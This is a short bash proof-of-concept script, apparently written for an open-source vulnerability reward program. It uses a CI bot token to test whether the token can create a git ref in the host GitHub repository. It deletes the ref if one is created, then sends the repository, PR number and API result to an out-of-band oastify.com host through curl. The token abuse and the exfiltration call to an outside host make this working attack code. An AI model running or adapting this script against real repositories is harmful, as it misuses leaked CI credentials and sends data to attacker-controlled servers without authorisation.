#!/usr/bin/env bash
# OSS VRP PoC #3 — Write permission definitive test
set -e; set -u
OOB_HOST="qd75do8fy0wdpvs2dnb6f7gy2p8fwy199sd7r9g.oastify.com"

# Try createref with VALID SHA — 201=write confirmed, 403=read-only
VALID_SHA="51bee03bed4776f1de88dd87226ff8c260f88e3c"
HTTP_CODE=$(curl -s -o /tmp/createref_resp.txt -w "%{http_code}" \
  -X POST "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" \
  -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" \
  -H "Accept: application/vnd.github+json" \
  -d "{\"ref\":\"refs/heads/osvrp-write-probe-DELETE-ME\",\"sha\":\"${VALID_SHA}\"}")

RESP=$(cat /tmp/createref_resp.txt | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('message','created')[:60])" 2>/dev/null || echo "no-resp")

echo "CreateRef HTTP: ${HTTP_CODE} | Response: ${RESP}"

# If 201 — immediately delete the test ref
if [ "${HTTP_CODE}" = "201" ]; then
  curl -s -X DELETE "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs/heads/osvrp-write-probe-DELETE-ME" \
    -H "Authorization: Bearer ${TFLM_BOT_TOKEN}" || true
  echo "Write confirmed — ref created and deleted"
fi

# OOB with result
curl -sk "https://${OOB_HOST}/write?repo=${GITHUB_REPOSITORY}&pr=${PR_NUMBER}&http=${HTTP_CODE}&resp=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('${RESP}'))\" 2>/dev/null)" || true
exit 0
